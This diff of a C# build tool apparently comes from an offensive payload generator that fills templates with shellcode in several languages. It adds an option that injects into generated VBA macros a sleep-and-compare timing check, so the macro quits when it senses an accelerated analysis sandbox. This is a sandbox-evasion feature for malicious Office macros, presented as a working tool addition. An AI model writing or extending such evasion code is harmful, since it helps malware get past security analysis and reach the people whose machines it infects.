@@ -276,6 +276,32 @@ namespace Build
                 text = text.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
 
 
+                //This block is going to add a simple time check to any VBA macros
+                if (CONFIG.DETECT_SANDBOX_TIME)
+                {
+                    StringBuilder sb = new StringBuilder();
+                    if (fi.Extension == ".vba")
+                    {
+                        sb.AppendLine($"    Dim t1 As Date");
+                        sb.AppendLine($"    Dim t2 As Date");
+                        sb.AppendLine($"    Dim time As Long");
+                        sb.AppendLine($"    t1 = Now()");
+                        sb.AppendLine($"    Sleep (2000)");
+                        sb.AppendLine($"    t2 = Now()");
+                        sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
+                        sb.AppendLine($"    If time < 2 Then");
+                        sb.AppendLine($"        Exit Function");
+                        sb.AppendLine($"    End If");
+                    }
+
+                    text = text.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
+                }
+                else
+                {
+                    text = text.Replace("{DETECT_SANDBOX_TIME}", "");
+                }
+
+
                 //Convert shellcode strings to appropriate language
                 if (fi.Extension == ".ps1")
                 {
